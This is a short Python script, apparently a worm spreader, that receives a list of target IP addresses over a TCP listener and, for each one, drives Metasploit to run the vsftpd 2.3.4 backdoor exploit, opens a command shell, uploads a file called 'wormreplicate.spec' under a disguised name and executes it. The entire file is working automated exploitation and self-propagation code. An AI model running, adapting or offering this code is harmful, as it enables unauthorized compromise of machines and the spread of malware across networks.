#!python3
from nclib import TCPServer
import pexpect
import sys
import random
import string as strings

def listener():

	server = TCPServer(("192.168.56.108", 1337))
	for client in server:
		target_list = client.recv()

		target_list = str(target_list.rstrip())

		target_list = target_list[3:-2]

		target_list = target_list.split(',')

		print(target_list)
		return target_list

def generate(target):
	
	process = pexpect.spawn(["msfconsole"])
	process.logfile = sys.stdout.buffer
	process.expect("msf6")

	process.sendline("use exploit/unix/ftp/vsftpd_234_backdoor")
	process.sendline("set rhost "+target)
	process.sendline("run")
	process.expect("Command shell session 1 opened")

	#letters = strings.ascii_lowercase()
	randname = 'jkhdsasdasdffdgw.py'


	process.sendline("upload /home/peyton/Documents/Worm/wormreplicate.spec "+randname)
	process.expect("upload finished")

	process.sendline("shell")
	process.sendline("cd / && chmod +x "+randname+" && ./"+randname)
	process.expect("success")

	
target_list = listener()
#target_list = ['192.168.56.112']
for target in target_list:
	generate(target)
